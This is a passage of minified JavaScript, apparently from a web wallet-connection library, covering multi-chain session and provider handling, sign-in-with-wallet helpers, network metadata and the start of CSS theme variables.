cut.init({core:this.providerOpts.core,logger:this.providerOpts.logger||TG,relayUrl:this.providerOpts.relayUrl||lut,projectId:this.providerOpts.projectId,metadata:this.providerOpts.metadata,storageOptions:this.providerOpts.storageOptions,storage:this.providerOpts.storage,name:this.providerOpts.name,customStoragePrefix:this.providerOpts.customStoragePrefix,telemetryEnabled:this.providerOpts.telemetryEnabled}),this.providerOpts.session)try{this.session=this.client.session.get(this.providerOpts.session.topic)}catch(i){throw this.logger.error("Failed to get session",i),new Error(`The provided session: ${(t=(e=this.providerOpts)==null?void 0:e.session)==null?void 0:t.topic} doesn't exist in the Sign client`)}else{const i=this.client.session.getAll();this.session=i[0]}this.logger.trace("SignClient Initialized")}createProviders(){if(!this.client)throw new Error("Sign Client not initialized");if(!this.session)throw new Error("Session not initialized. Please call connect() before enable()");const e=[...new Set(Object.keys(this.session.namespaces).map(t=>Qm(t)))];OT("client",this.client),OT("events",this.events),OT("disableProviderPing",this.disableProviderPing),e.forEach(t=>{if(!this.session)return;const i=Vut(t,this.session),n=Yoe(i),s=M8(this.namespaces,this.optionalNamespaces),o=BT(D8({},s[t]),{accounts:i,chains:n});switch(t){case"eip155":this.rpcProviders[t]=new tdt({namespace:o});break;case"algorand":this.rpcProviders[t]=new udt({namespace:o});break;case"solana":this.rpcProviders[t]=new ndt({namespace:o});break;case"cosmos":this.rpcProviders[t]=new adt({namespace:o});break;case"polkadot":this.rpcProviders[t]=new Zut({namespace:o});break;case"cip34":this.rpcProviders[t]=new fdt({namespace:o});break;case"elrond":this.rpcProviders[t]=new mdt({namespace:o});break;case"multiversx":this.rpcProviders[t]=new vdt({namespace:o});break;case"near":this.rpcProviders[t]=new Cdt({namespace:o});break;case"tezos":this.rpcProviders[t]=new Sdt({namespace:o});break;default:this.rpcProviders[Fm]?this.rpcProviders[Fm].updateNamespace(o):this.rpcProviders[Fm]=new Tdt({namespace:o})}})}registerEventListeners(){if(typeof this.client>"u")throw new Error("Sign Client is not initialized");this.client.on("session_ping",e=>{var t;const{topic:i}=e;i===((t=this.session)==null?void 0:t.topic)&&this.events.emit("session_ping",e)}),this.client.on("session_event",e=>{var t;const{params:i,topic:n}=e;if(n!==((t=this.session)==null?void 0:t.topic))return;const{event:s}=i;if(s.name==="accountsChanged"){const o=s.data;o&&Jf(o)&&this.events.emit("accountsChanged",o.map(BG))}else if(s.name==="chainChanged"){const o=i.chainId,a=i.event.data,c=Qm(o),l=RT(o)!==RT(a)?`${c}:${RT(a)}`:o;this.onChainChanged(l)}else this.events.emit(s.name,s.data);this.events.emit("session_event",e)}),this.client.on("session_update",({topic:e,params:t})=>{var i,n;if(e!==((i=this.session)==null?void 0:i.topic))return;const{namespaces:s}=t,o=(n=this.client)==null?void 0:n.session.get(e);this.session=BT(D8({},o),{namespaces:s}),this.onSessionUpdate(),this.events.emit("session_update",{topic:e,params:t})}),this.client.on("session_delete",async e=>{var t;e.topic===((t=this.session)==null?void 0:t.topic)&&(await this.cleanup(),this.events.emit("session_delete",e),this.events.emit("disconnect",BT(D8({},Vi("USER_DISCONNECTED")),{data:e.topic})))}),this.on(_l.DEFAULT_CHAIN_CHANGED,e=>{this.onChainChanged(e,!0)})}getProvider(e){return this.rpcProviders[e]||this.rpcProviders[Fm]}onSessionUpdate(){Object.keys(this.rpcProviders).forEach(e=>{var t;this.getProvider(e).updateNamespace((t=this.session)==null?void 0:t.namespaces[e])})}setNamespaces(e){const{namespaces:t={},optionalNamespaces:i={},sessionProperties:n,scopedProperties:s}=e;this.optionalNamespaces=M8(t,i),this.sessionProperties=n,this.scopedProperties=s}validateChain(e){const[t,i]=e?.split(":")||["",""];if(!this.namespaces||!Object.keys(this.namespaces).length)return[t,i];if(t&&!Object.keys(this.namespaces||{}).map(o=>Qm(o)).includes(t))throw new Error(`Namespace '${t}' is not configured. Please call connect() first with namespace config.`);if(t&&i)return[t,i];const n=Qm(Object.keys(this.namespaces)[0]),s=this.rpcProviders[n].getDefaultChain();return[n,s]}async requestAccounts(){const[e]=this.validateChain();return await this.getProvider(e).requestAccounts()}async onChainChanged(e,t=!1){if(!this.namespaces)return;const[i,n]=this.validateChain(e);if(!n)return;this.updateNamespaceChain(i,n),this.events.emit("chainChanged",n);const s=this.getProvider(i).getDefaultChain();t||this.getProvider(i).setDefaultChain(n),this.emitAccountsChangedOnChainChange({namespace:i,previousChainId:s,newChainId:e}),await this.persist("namespaces",this.namespaces)}emitAccountsChangedOnChainChange({namespace:e,previousChainId:t,newChainId:i}){var n,s;try{if(t===i)return;const o=(s=(n=this.session)==null?void 0:n.namespaces[e])==null?void 0:s.accounts;if(!o)return;const a=o.filter(c=>c.includes(`${i}:`)).map(BG);if(!Jf(a))return;this.events.emit("accountsChanged",a)}catch(o){this.logger.warn("Failed to emit accountsChanged on chain change",o)}}updateNamespaceChain(e,t){if(!this.namespaces)return;const i=this.namespaces[e]?e:`${e}:${t}`,n={chains:[],methods:[],events:[],defaultChain:t};this.namespaces[i]?this.namespaces[i]&&(this.namespaces[i].defaultChain=t):this.namespaces[i]=n}onConnect(){this.createProviders(),this.events.emit("connect",{session:this.session})}async cleanup(){this.namespaces=void 0,this.optionalNamespaces=void 0,this.sessionProperties=void 0,await this.deleteFromStore("namespaces"),await this.deleteFromStore("optionalNamespaces"),await this.deleteFromStore("sessionProperties"),this.session=void 0,await this.cleanupPendingPairings({deletePairings:!0}),await this.cleanupStorage()}async persist(e,t){var i;const n=((i=this.session)==null?void 0:i.topic)||"";await this.client.core.storage.setItem(`${O8}/${e}${n}`,t)}async getFromStore(e){var t;const i=((t=this.session)==null?void 0:t.topic)||"";return await this.client.core.storage.getItem(`${O8}/${e}${i}`)}async deleteFromStore(e){var t;const i=((t=this.session)==null?void 0:t.topic)||"";await this.client.core.storage.removeItem(`${O8}/${e}${i}`)}async cleanupStorage(){var e;try{if(((e=this.client)==null?void 0:e.session.length)>0)return;const t=await this.client.core.storage.getKeys();for(const i of t)i.startsWith(O8)&&await this.client.core.storage.removeItem(i)}catch(t){this.logger.warn("Failed to cleanup storage",t)}}}const z1={getSIWX(){return Be.state.siwx},async initializeIfEnabled(){const r=Be.state.siwx,e=de.getActiveCaipAddress();if(!(r&&e))return;const[t,i,n]=e.split(":");if(de.checkIfSupportedNetwork(t))try{if((await r.getSessions(`${t}:${i}`,n)).length)return;await Ri.open({view:"SIWXSignMessage"})}catch(s){console.error("SIWXUtil:initializeIfEnabled",s),Hr.sendEvent({type:"track",event:"SIWX_AUTH_ERROR",properties:this.getSIWXEventProperties()}),await ut._getClient()?.disconnect().catch(console.error),tt.reset("Connect"),ts.showError("A problem occurred while trying initialize authentication")}},async requestSignMessage(){const r=Be.state.siwx,e=Ze.getPlainAddress(de.getActiveCaipAddress()),t=de.getActiveCaipNetwork(),i=ut._getClient();if(!r)throw new Error("SIWX is not enabled");if(!e)throw new Error("No ActiveCaipAddress found");if(!t)throw new Error("No ActiveCaipNetwork or client found");if(!i)throw new Error("No ConnectionController client found");try{const n=await r.createMessage({chainId:t.caipNetworkId,accountAddress:e}),s=n.toString();We.getConnectorId(t.chainNamespace)===Ht.CONNECTOR_ID.AUTH&&tt.pushTransactionStack({});const a=await i.signMessage(s);await r.addSession({data:n,message:s,signature:a}),Ri.close(),Hr.sendEvent({type:"track",event:"SIWX_AUTH_SUCCESS",properties:this.getSIWXEventProperties()})}catch(n){const s=this.getSIWXEventProperties();(!Ri.state.open||tt.state.view==="ApproveTransaction")&&await Ri.open({view:"SIWXSignMessage"}),s.isSmartAccount?ts.showError("This application might not support Smart Accounts"):ts.showError("Signature declined"),Hr.sendEvent({type:"track",event:"SIWX_AUTH_ERROR",properties:s}),console.error("SWIXUtil:requestSignMessage",n)}},async cancelSignMessage(){try{this.getSIWX()?.getRequired?.()?await ut.disconnect():Ri.close(),tt.reset("Connect"),Hr.sendEvent({event:"CLICK_CANCEL_SIWX",type:"track",properties:this.getSIWXEventProperties()})}catch(r){console.error("SIWXUtil:cancelSignMessage",r)}},async getSessions(){const r=Be.state.siwx,e=Ze.getPlainAddress(de.getActiveCaipAddress()),t=de.getActiveCaipNetwork();return r&&e&&t?r.getSessions(t.caipNetworkId,e):[]},async isSIWXCloseDisabled(){const r=this.getSIWX();if(r){const e=tt.state.view==="ApproveTransaction",t=tt.state.view==="SIWXSignMessage";if(e||t)return r.getRequired?.()&&(await this.getSessions()).length===0}return!1},async universalProviderAuthenticate({universalProvider:r,chains:e,methods:t}){const i=z1.getSIWX(),n=new Set(e.map(a=>a.split(":")[0]));if(!i||n.size!==1||!n.has("eip155"))return!1;const s=await i.createMessage({chainId:de.getActiveCaipNetwork()?.caipNetworkId||"",accountAddress:""}),o=await r.authenticate({nonce:s.nonce,domain:s.domain,uri:s.uri,exp:s.expirationTime,iat:s.issuedAt,nbf:s.notBefore,requestId:s.requestId,version:s.version,resources:s.resources,statement:s.statement,chainId:s.chainId,methods:t,chains:[s.chainId,...e.filter(a=>a!==s.chainId)]});if(ts.showLoading("Authenticating...",{autoClose:!1}),qt.setConnectedWalletInfo({...o.session.peer.metadata,name:o.session.peer.metadata.name,icon:o.session.peer.metadata.icons?.[0],type:"WALLET_CONNECT"},Array.from(n)[0]),o?.auths?.length){const a=o.auths.map(c=>{const l=r.client.formatAuthMessage({request:c.p,iss:c.p.iss});return{data:{...c.p,accountAddress:c.p.iss.split(":").slice(-1).join(""),chainId:c.p.iss.split(":").slice(2,4).join(":"),uri:c.p.aud,version:c.p.version||s.version,expirationTime:c.p.exp,issuedAt:c.p.iat,notBefore:c.p.nbf},message:l,signature:c.s.s,cacao:c}});try{await i.setSessions(a),Hr.sendEvent({type:"track",event:"SIWX_AUTH_SUCCESS",properties:z1.getSIWXEventProperties()})}catch(c){throw console.error("SIWX:universalProviderAuth - failed to set sessions",c),Hr.sendEvent({type:"track",event:"SIWX_AUTH_ERROR",properties:z1.getSIWXEventProperties()}),await r.disconnect().catch(console.error),c}finally{ts.hide()}}return!0},getSIWXEventProperties(){const r=de.state.activeChain;return{network:de.state.activeCaipNetwork?.caipNetworkId||"",isSmartAccount:qt.state.preferredAccountTypes?.[r]===K5.ACCOUNT_TYPES.SMART_ACCOUNT}},async clearSessions(){const r=this.getSIWX();r&&await r.setSessions([])}},Qoe={isUnsupportedChainView(){return tt.state.view==="UnsupportedChain"||tt.state.view==="SwitchNetwork"&&tt.state.history.includes("UnsupportedChain")},async safeClose(){if(this.isUnsupportedChainView()){Ri.shake();return}if(await z1.isSIWXCloseDisabled()){Ri.shake();return}Ri.close()}};function L8(r,e){return We.getConnectorId(r)===e}function Odt(r){const e=Array.from(de.state.chains.keys());let t=[];return r?(t.push([r,de.state.chains.get(r)]),L8(r,Ht.CONNECTOR_ID.WALLET_CONNECT)?e.forEach(i=>{i!==r&&L8(i,Ht.CONNECTOR_ID.WALLET_CONNECT)&&t.push([i,de.state.chains.get(i)])}):L8(r,Ht.CONNECTOR_ID.AUTH)&&e.forEach(i=>{i!==r&&L8(i,Ht.CONNECTOR_ID.AUTH)&&t.push([i,de.state.chains.get(i)])})):t=Array.from(de.state.chains.entries()),t}const bf={EIP155:"eip155",CONNECTOR_TYPE_WALLET_CONNECT:"WALLET_CONNECT",CONNECTOR_TYPE_INJECTED:"INJECTED",CONNECTOR_TYPE_ANNOUNCED:"ANNOUNCED"},ux={NetworkImageIds:{1:"ba0ba0cd-17c6-4806-ad93-f9d174f17900",42161:"3bff954d-5cb0-47a0-9a23-d20192e74600",43114:"30c46e53-e989-45fb-4549-be3bd4eb3b00",56:"93564157-2e8e-4ce7-81df-b264dbee9b00",250:"06b26297-fe0c-4733-5d6b-ffa5498aac00",10:"ab9c186a-c52f-464b-2906-ca59d760a400",137:"41d04d42-da3b-4453-8506-668cc0727900",5e3:"e86fae9b-b770-4eea-e520-150e12c81100",295:"6a97d510-cac8-4e58-c7ce-e8681b044c00",11155111:"e909ea0a-f92a-4512-c8fc-748044ea6800",84532:"a18a7ecd-e307-4360-4746-283182228e00",1301:"4eeea7ef-0014-4649-5d1d-07271a80f600",130:"2257980a-3463-48c6-cbac-a42d2a956e00",10143:"0a728e83-bacb-46db-7844-948f05434900",100:"02b53f6a-e3d4-479e-1cb4-21178987d100",9001:"f926ff41-260d-4028-635e-91913fc28e00",324:"b310f07f-4ef7-49f3-7073-2a0a39685800",314:"5a73b3dd-af74-424e-cae0-0de859ee9400",4689:"34e68754-e536-40da-c153-6ef2e7188a00",1088:"3897a66d-40b9-4833-162f-a2c90531c900",1284:"161038da-44ae-4ec7-1208-0ea569454b00",1285:"f1d73bb6-5450-4e18-38f7-fb6484264a00",7777777:"845c60df-d429-4991-e687-91ae45791600",42220:"ab781bbc-ccc6-418d-d32d-789b15da1f00",8453:"7289c336-3981-4081-c5f4-efc26ac64a00",1313161554:"3ff73439-a619-4894-9262-4470c773a100",2020:"b8101fc0-9c19-4b6f-ec65-f6dfff106e00",2021:"b8101fc0-9c19-4b6f-ec65-f6dfff106e00",80094:"e329c2c9-59b0-4a02-83e4-212ff3779900",2741:"fc2427d1-5af9-4a9c-8da5-6f94627cd900","5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp":"a1b58899-f671-4276-6a5e-56ca5bd59700","4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z":"a1b58899-f671-4276-6a5e-56ca5bd59700",EtWTRABZaYq6iMfeYKouRu166VU2xqa1:"a1b58899-f671-4276-6a5e-56ca5bd59700","000000000019d6689c085ae165831e93":"0b4838db-0161-4ffe-022d-532bf03dba00","000000000933ea01ad0ee984209779ba":"39354064-d79b-420b-065d-f980c4b78200"},ConnectorImageIds:{[Ht.CONNECTOR_ID.COINBASE]:"0c2840c3-5b04-4c44-9661-fbd4b49e1800",[Ht.CONNECTOR_ID.COINBASE_SDK]:"0c2840c3-5b04-4c44-9661-fbd4b49e1800",[Ht.CONNECTOR_ID.SAFE]:"461db637-8616-43ce-035a-d89b8a1d5800",[Ht.CONNECTOR_ID.LEDGER]:"54a1aa77-d202-4f8d-0fb2-5d2bb6db0300",[Ht.CONNECTOR_ID.WALLET_CONNECT]:"ef1a1fcf-7fe8-4d69-bd6d-fda1345b4400",[Ht.CONNECTOR_ID.INJECTED]:"07ba87ed-43aa-4adf-4540-9e6a2b9cae00"},ConnectorNamesMap:{[Ht.CONNECTOR_ID.INJECTED]:"Browser Wallet",[Ht.CONNECTOR_ID.WALLET_CONNECT]:"WalletConnect",[Ht.CONNECTOR_ID.COINBASE]:"Coinbase",[Ht.CONNECTOR_ID.COINBASE_SDK]:"Coinbase",[Ht.CONNECTOR_ID.LEDGER]:"Ledger",[Ht.CONNECTOR_ID.SAFE]:"Safe"}},EB={getCaipTokens(r){if(!r)return;const e={};return Object.entries(r).forEach(([t,i])=>{e[`${bf.EIP155}:${t}`]=i}),e},isLowerCaseMatch(r,e){return r?.toLowerCase()===e?.toLowerCase()}};new AbortController;const Sm={UniversalProviderErrors:{UNAUTHORIZED_DOMAIN_NOT_ALLOWED:{message:"Unauthorized: origin not allowed",alertErrorKey:"INVALID_APP_CONFIGURATION"},JWT_VALIDATION_ERROR:{message:"JWT validation error: JWT Token is not yet valid",alertErrorKey:"JWT_TOKEN_NOT_VALID"},INVALID_KEY:{message:"Unauthorized: invalid key",alertErrorKey:"INVALID_PROJECT_ID"}},ALERT_ERRORS:{SWITCH_NETWORK_NOT_FOUND:{shortMessage:"Network Not Found",longMessage:"Network not found - please make sure it is included in 'networks' array in createAppKit function"},INVALID_APP_CONFIGURATION:{shortMessage:"Invalid App Configuration",longMessage:()=>`Origin ${Bdt()?window.origin:"unknown"} not found on Allowlist - update configuration on cloud.reown.com`},IFRAME_LOAD_FAILED:{shortMessage:"Network Error - Could not load embedded wallet",longMessage:()=>"There was an issue loading the embedded wallet. Please try again later."},IFRAME_REQUEST_TIMEOUT:{shortMessage:"Embedded Wallet Request Timed Out",longMessage:()=>"There was an issue doing the request to the embedded wallet. Please try again later."},UNVERIFIED_DOMAIN:{shortMessage:"Invalid App Configuration",longMessage:()=>"There was an issue loading the embedded wallet. Please verify that your domain is allowed at cloud.reown.com"},JWT_TOKEN_NOT_VALID:{shortMessage:"Session Expired",longMessage:"Invalid session found on UniversalProvider - please check your time settings and connect again"},INVALID_PROJECT_ID:{shortMessage:"Invalid App Configuration",longMessage:"Invalid Project ID - update configuration"},PROJECT_ID_NOT_CONFIGURED:{shortMessage:"Project ID Not Configured",longMessage:"Project ID Not Configured - update configuration on cloud.reown.com"}}};function Bdt(){return typeof window<"u"}const Mdt={createLogger(r,e="error"){const t=ra({level:e}),{logger:i}=_3({opts:t});return i.error=(...n)=>{for(const s of n)if(s instanceof Error){r(s,...n);return}r(void 0,...n)},i}},Ddt="rpc.walletconnect.org";function FG(r,e){const t=new URL("https://rpc.walletconnect.org/v1/");return t.searchParams.set("chainId",r),t.searchParams.set("projectId",e),t.toString()}const MT=["near:mainnet","solana:5eykt4UsFv8P8NJdTREpY1vzqKqZKvdp","eip155:1101","eip155:56","eip155:42161","eip155:7777777","eip155:59144","eip155:324","solana:EtWTRABZaYq6iMfeYKouRu166VU2xqa1","eip155:5000","solana:4sgjmw1sunhzsxgspuhpqldx6wiyjntz","eip155:80084","eip155:5003","eip155:100","eip155:8453","eip155:42220","eip155:1313161555","eip155:17000","eip155:1","eip155:300","eip155:1313161554","eip155:1329","eip155:84532","eip155:421614","eip155:11155111","eip155:8217","eip155:43114","solana:4uhcVJyU9pJkvQyS88uRDiswHXSCkY3z","eip155:999999999","eip155:11155420","eip155:80002","eip155:97","eip155:43113","eip155:137","eip155:10","eip155:1301","bip122:000000000019d6689c085ae165831e93","bip122:000000000933ea01ad0ee984209779ba"],qm={extendRpcUrlWithProjectId(r,e){let t=!1;try{t=new URL(r).host===Ddt}catch{t=!1}if(t){const i=new URL(r);return i.searchParams.has("projectId")||i.searchParams.set("projectId",e),i.toString()}return r},isCaipNetwork(r){return"chainNamespace"in r&&"caipNetworkId"in r},getChainNamespace(r){return this.isCaipNetwork(r)?r.chainNamespace:Ht.CHAIN.EVM},getCaipNetworkId(r){return this.isCaipNetwork(r)?r.caipNetworkId:`${Ht.CHAIN.EVM}:${r.id}`},getDefaultRpcUrl(r,e,t){const i=r.rpcUrls?.default?.http?.[0];return MT.includes(e)?FG(e,t):i||""},extendCaipNetwork(r,{customNetworkImageUrls:e,projectId:t,customRpcUrls:i}){const n=this.getChainNamespace(r),s=this.getCaipNetworkId(r),o=r.rpcUrls.default.http?.[0],a=this.getDefaultRpcUrl(r,s,t),c=r?.rpcUrls?.chainDefault?.http?.[0]||o,l=i?.[s]?.map(h=>h.url)||[],u=[...l,a],d=[...l];return c&&!d.includes(c)&&d.push(c),{...r,chainNamespace:n,caipNetworkId:s,assets:{imageId:ux.NetworkImageIds[r.id],imageUrl:e?.[r.id]},rpcUrls:{...r.rpcUrls,default:{http:u},chainDefault:{http:d}}}},extendCaipNetworks(r,{customNetworkImageUrls:e,projectId:t,customRpcUrls:i}){return r.map(n=>qm.extendCaipNetwork(n,{customNetworkImageUrls:e,customRpcUrls:i,projectId:t}))},getViemTransport(r,e,t){const i=[];return t?.forEach(n=>{i.push(y1(n.url,n.config))}),MT.includes(r.caipNetworkId)&&i.push(y1(FG(r.caipNetworkId,e),{fetchOptions:{headers:{"Content-Type":"text/plain"}}})),r?.rpcUrls?.default?.http?.forEach(n=>{i.push(y1(n))}),Lk(i)},extendWagmiTransports(r,e,t){if(MT.includes(r.caipNetworkId)){const i=this.getDefaultRpcUrl(r,r.caipNetworkId,e);return Lk([t,y1(i)])}return t},getUnsupportedNetwork(r){return{id:r.split(":")[1],caipNetworkId:r,name:Ht.UNSUPPORTED_NETWORK_NAME,chainNamespace:r.split(":")[0],nativeCurrency:{name:"",decimals:0,symbol:""},rpcUrls:{default:{http:[]}}}},getCaipNetworkFromStorage(r){const e=Bt.getActiveCaipNetworkId(),t=de.getAllRequestedCaipNetworks(),i=Array.from(de.state.chains?.keys()||[]),n=e?.split(":")[0],s=n?i.includes(n):!1,o=t?.find(c=>c.caipNetworkId===e);return s&&!o&&e?this.getUnsupportedNetwork(e):o||r||t?.[0]}},dx={eip155:void 0,solana:void 0,polkadot:void 0,bip122:void 0,cosmos:void 0},fa=sr({providers:{...dx},providerIds:{...dx}}),An={state:fa,subscribeKey(r,e){return ci(fa,r,e)},subscribe(r){return ai(fa,()=>{r(fa)})},subscribeProviders(r){return ai(fa.providers,()=>r(fa.providers))},setProvider(r,e){e&&(fa.providers[r]=Ra(e))},getProvider(r){return fa.providers[r]},setProviderId(r,e){e&&(fa.providerIds[r]=e)},getProviderId(r){if(r)return fa.providerIds[r]},reset(){fa.providers={...dx},fa.providerIds={...dx}},resetChain(r){fa.providers[r]=void 0,fa.providerIds[r]=void 0}},jf={VIEW_DIRECTION:{Next:"next",Prev:"prev"},DEFAULT_CONNECT_METHOD_ORDER:["email","social","wallet"],ANIMATION_DURATIONS:{HeaderText:120,ModalHeight:150,ViewTransition:150}},Og={filterOutDuplicatesByRDNS(r){const e=Be.state.enableEIP6963?We.state.connectors:[],t=Bt.getRecentWallets(),i=e.map(a=>a.info?.rdns).filter(Boolean),n=t.map(a=>a.rdns).filter(Boolean),s=i.concat(n);if(s.includes("io.metamask.mobile")&&Ze.isMobile()){const a=s.indexOf("io.metamask.mobile");s[a]="io.metamask"}return r.filter(a=>!s.includes(String(a?.rdns)))},filterOutDuplicatesByIds(r){const e=We.state.connectors.filter(a=>a.type==="ANNOUNCED"||a.type==="INJECTED"),t=Bt.getRecentWallets(),i=e.map(a=>a.explorerId),n=t.map(a=>a.id),s=i.concat(n);return r.filter(a=>!s.includes(a?.id))},filterOutDuplicateWallets(r){const e=this.filterOutDuplicatesByRDNS(r);return this.filterOutDuplicatesByIds(e)},markWalletsAsInstalled(r){const{connectors:e}=We.state,{featuredWalletIds:t}=Be.state,i=e.filter(o=>o.type==="ANNOUNCED").reduce((o,a)=>(a.info?.rdns&&(o[a.info.rdns]=!0),o),{});return r.map(o=>({...o,installed:!!o.rdns&&!!i[o.rdns??""]})).sort((o,a)=>{const c=Number(a.installed)-Number(o.installed);if(c!==0)return c;if(t?.length){const l=t.indexOf(o.id),u=t.indexOf(a.id);if(l!==-1&&u!==-1)return l-u;if(l!==-1)return-1;if(u!==-1)return 1}return 0})},getConnectOrderMethod(r,e){const t=r?.connectMethodsOrder||Be.state.features?.connectMethodsOrder,i=e||We.state.connectors;if(t)return t;const{injected:n,announced:s}=o0.getConnectorsByType(i,rt.state.recommended,rt.state.featured),o=n.filter(o0.showConnector),a=s.filter(o0.showConnector);return o.length||a.length?["wallet","email","social"]:jf.DEFAULT_CONNECT_METHOD_ORDER},isExcluded(r){const e=!!r.rdns&&rt.state.excludedWallets.some(i=>i.rdns===r.rdns),t=!!r.name&&rt.state.excludedWallets.some(i=>EB.isLowerCaseMatch(i.name,r.name));return e||t}},o0={getConnectorsByType(r,e,t){const{customWallets:i}=Be.state,n=Bt.getRecentWallets(),s=Og.filterOutDuplicateWallets(e),o=Og.filterOutDuplicateWallets(t),a=r.filter(d=>d.type==="MULTI_CHAIN"),c=r.filter(d=>d.type==="ANNOUNCED"),l=r.filter(d=>d.type==="INJECTED"),u=r.filter(d=>d.type==="EXTERNAL");return{custom:i,recent:n,external:u,multiChain:a,announced:c,injected:l,recommended:s,featured:o}},showConnector(r){const e=r.info?.rdns,t=!!e&&rt.state.excludedWallets.some(n=>!!n.rdns&&n.rdns===e),i=!!r.name&&rt.state.excludedWallets.some(n=>EB.isLowerCaseMatch(n.name,r.name));return!(r.type==="INJECTED"&&(r.name==="Browser Wallet"&&(!Ze.isMobile()||Ze.isMobile()&&!e&&!ut.checkInstalled())||t||i)||(r.type==="ANNOUNCED"||r.type==="EXTERNAL")&&(t||i))},getIsConnectedWithWC(){return Array.from(de.state.chains.values()).some(t=>We.getConnectorId(t.namespace)===Ht.CONNECTOR_ID.WALLET_CONNECT)},getConnectorTypeOrder({recommended:r,featured:e,custom:t,recent:i,announced:n,injected:s,multiChain:o,external:a,overriddenConnectors:c=Be.state.features?.connectorTypeOrder??[]}){const l=o0.getIsConnectedWithWC(),h=[{type:"walletConnect",isEnabled:Be.state.enableWalletConnect&&!l},{type:"recent",isEnabled:i.length>0},{type:"injected",isEnabled:[...s,...n,...o].length>0},{type:"featured",isEnabled:e.length>0},{type:"custom",isEnabled:t&&t.length>0},{type:"external",isEnabled:a.length>0},{type:"recommended",isEnabled:r.length>0}].filter(w=>w.isEnabled),f=new Set(h.map(w=>w.type)),p=c.filter(w=>f.has(w)).map(w=>({type:w,isEnabled:!0})),g=h.filter(({type:w})=>!p.some(({type:x})=>x===w));return Array.from(new Set([...p,...g].map(({type:w})=>w)))}};let X5,Xf,ep;function Ldt(r,e){X5=document.createElement("style"),Xf=document.createElement("style"),ep=document.createElement("style"),X5.textContent=fw(r).core.cssText,Xf.textContent=fw(r).dark.cssText,ep.textContent=fw(r).light.cssText,document.head.appendChild(X5),document.head.appendChild(Xf),document.head.appendChild(ep),Xoe(e)}function Xoe(r){Xf&&ep&&(r==="light"?(Xf.removeAttribute("media"),ep.media="enabled"):(ep.removeAttribute("media"),Xf.media="enabled"))}function Udt(r){X5&&Xf&&ep&&(X5.textContent=fw(r).core.cssText,Xf.textContent=fw(r).dark.cssText,ep.textContent=fw(r).light.cssText)}function fw(r){return{core:ge`
      @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
      @keyframes w3m-shake {
        0% {
          transform: scale(1) rotate(0deg);
        }
        20% {
          transform: scale(1) rotate(-1deg);
        }
        40% {
          transform: scale(1) rotate(1.5deg);
        }
        60% {
          transform: scale(1) rotate(-1.5deg);
        }
        80% {
          transform: scale(1) rotate(1deg);
        }
        100% {
          transform: scale(1) rotate(0deg);
        }
      }
      @keyframes w3m-iframe-fade-out {
        0% {
          opacity: 1;
        }
        100% {
          opacity: 0;
        }
      }
      @keyframes w3m-iframe-zoom-in {
        0% {
          transform: translateY(50px);
          opacity: 0;
        }
        100% {
          transform: translateY(0px);
          opacity: 1;
        }
      }
      @keyframes w3m-iframe-zoom-in-mobile {
        0% {
          transform: scale(0.95);
          opacity: 0;
        }
        100% {
          transform: scale(1);
          opacity: 1;
        }
      }
      :root {
        --w3m-modal-width: 360px;
        --w3m-color-mix-strength: ${Tn(r?.["--w3m-color-mix-strength"]?`${r["--w3m-color-mix-strength"]}%`:"0%")};
        --w3m-font-family: ${Tn(r?.["--w3m-font-family"]||"Inter, Segoe UI, Roboto, Oxygen, Ubuntu, Cantarell, Fira Sans, Droid Sans, Helvetica Neue, sans-serif;")};
        --w3m-font-size-master: ${Tn(r?.["--w3m-font-size-master"]||"10px")};
        --w3m-border-radius-master: ${Tn(r?.["--w3m-border-radius-master"]||"4px")};
        --w3m-z-index: ${Tn(r?.["--w3m-z-index"]||999)};

        --wui-font-family: var(--w3m-font-family);

        --wui-font-size-mini: calc(var(--w3m-font-size-master) * 0.8);
        --wui-font-size-micro: var(--w3m-font-size-master);
        --wui-font-size-tiny: calc(var(--w3m-font-size-master) * 1.2);
        --wui-font-size-small: calc(var(--w3m-font-size-master) * 1.4);
        --wui-font-size-paragraph: calc(var(--w3m-font-size-master) * 1.6);
        --wui-font-size-medium: calc(var(--w3m-font-size-master) * 1.8);
        --wui-font-size-large: calc(var(--w3m-font-size-master) * 2);
        --wui-font-size-title-6: calc(var(--w3m-font-size-master) * 2.2);
        --wui-font-size-medium-title: calc(var(--w3m-font-size-master) * 2.4);
        --wui-font-size-2xl: calc(var(--w3m-font-size-master) * 4);

        --wui-border-radius-5xs: var(--w3m-border-radius-master);
        --wui-border-radius-4xs: calc(var(--w3m-border-radius-master) * 1.5);
        --wui-border-radius-3xs: calc(var(--w3m-border-radius-master) * 2);
        --wui-border-radius-xxs: calc(var(--w3m-border-radius-master) * 3);
        --wui-border-radius-xs: calc(var(--w3m-border-radius-master) * 4);
        --wui-border-radius-s: calc(var(--w3m-border-radius-master) * 5);
        --wui-border-radius-m: calc(var(--w3m-border-radius-master) * 7);
        --wui-border-radius-l: calc(var(--w3m-border-radius-master) * 9);
        --wui-border-radius-3xl: calc(var(--w3m-border-radius-master) * 20);

        --wui-font-weight-light: 400;
        --wui-font-weight-regular: 500;
        --wui-font-weight-medium: 600;
        --wui-font-weight-bold: 700;

        --wui-letter-spacing-2xl: -1.6px;
        --wui-letter-spacing-medium-title: -0.96px;
        --wui-letter-spacing-title-6: -0.88px;
        --wui-letter-spacing-large: -0.8px;
        --wui-letter-spacing-medium: -0.72px;
        --wui-letter-spacing-paragraph: -0.64px;
        --wui-letter-spacing-small: -0.56px;
        --wui-letter-spacing-tiny: -0.48px;
        --wui-letter-spacing-micro: -0.2px;
        --wui-letter-spacing-mini: -0.16px;

        --wui-spacing-0: 0px;
        --wui-spacing-4xs: 2px;
        --wui-spacing-3xs: 4px;
        --wui-spacing-xxs: 6px;
        --wui-spacing-2xs: 7px;
        --wui-spacing-xs: 8px;
        --wui-spacing-1xs: 10px;
        --wui-spacing-s: 12px;
        --wui-spacing-m: 14px;
        --wui-spacing-l: 16px;
        --wui-spacing-2l: 18px;
        --wui-spacing-xl: 20px;
        --wui-spacing-xxl: 24px;
        --wui-spacing-2xl: 32px;
        --wui-spacing-3xl: 40px;
        --wui-spacing-4xl: 90px;
        --wui-spacing-5xl: 95px;

        --wui-icon-box-size-xxs: 14px;
        --wui-icon-box-size-xs: 20px;
        --wui-icon-box-size-sm: 24px;
        --wui-icon-box-size-md: 32px;
        --wui-icon-box-size-mdl: 36px;
        --wui-icon-box-size-lg: 40px;
        --wui-icon-box-size-2lg: 48px;
        --wui-icon-box-size-xl: 64px;

        --wui-icon-size-inherit: inherit;
        --wui-icon-size-xxs: 10px;
